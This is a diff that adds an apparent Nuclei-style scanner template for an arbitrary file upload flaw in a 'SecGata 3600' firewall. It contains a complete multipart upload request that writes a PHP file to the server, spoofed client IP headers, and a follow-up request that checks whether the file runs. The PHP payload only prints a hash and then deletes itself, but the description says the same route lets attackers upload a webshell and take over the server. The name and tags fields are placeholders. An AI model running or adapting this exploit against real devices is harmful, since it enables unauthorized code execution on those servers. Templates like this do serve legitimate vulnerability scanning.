@@ -1,0 +1,51 @@
+id: SecGate3600-importsave-upload
+info:
+  name: Template Name
+  author: wangzong
+  severity: critical
+  description: Wangshen SecGata 3600 Firewall net_pro_keyword_import_save arbitrary file upload,vulnerability, Attackers can obtain server privileges by uploading webshell.
+  reference:
+    - https://github.com/h0e4a0r1t/h0e4a0r1t.github.io/commit/8a50323f782e32e59fbf9bf2a9a9c3fa522746cc
+  tags: tags
+  
+variables:
+  filename: "{{rand_base(6)}}"
+  boundary: "{{to_lower(rand_base(20))}}" 
+   
+http:
+  - raw:
+      - |
+        POST /?g=log_import_save HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:124.0) Gecko/20100101 Firefox/124.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Sec-GPC: 1
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+        X-Forwarded-For: 0000:0000:0000::0000
+        X-Originating-IP: 0000:0000:0000::0000
+        X-Remote-IP: 0000:0000:0000::0000
+        X-Remote-Addr: 0000:0000:0000::0000
+        Content-Type: multipart/form-data; boundary={{boundary}}
+        Content-Length: 264
+
+        --{{boundary}}
+        Content-Disposition: form-data; name="reqfile"; filename="{{filename}}.php"
+        Content-Type: text/plain
+
+        <?php echo(md5(1)); unlink(__FILE__); ?>
+        --{{boundary}}
+        Content-Disposition: form-data; name="submit_post"
+
+        net_pro_keyword_import_save
+        --{{boundary}}--
+      - |
+        GET /attachements/{{filename}}.php HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'c4ca4238a0b923820dcc509a6f75849b'
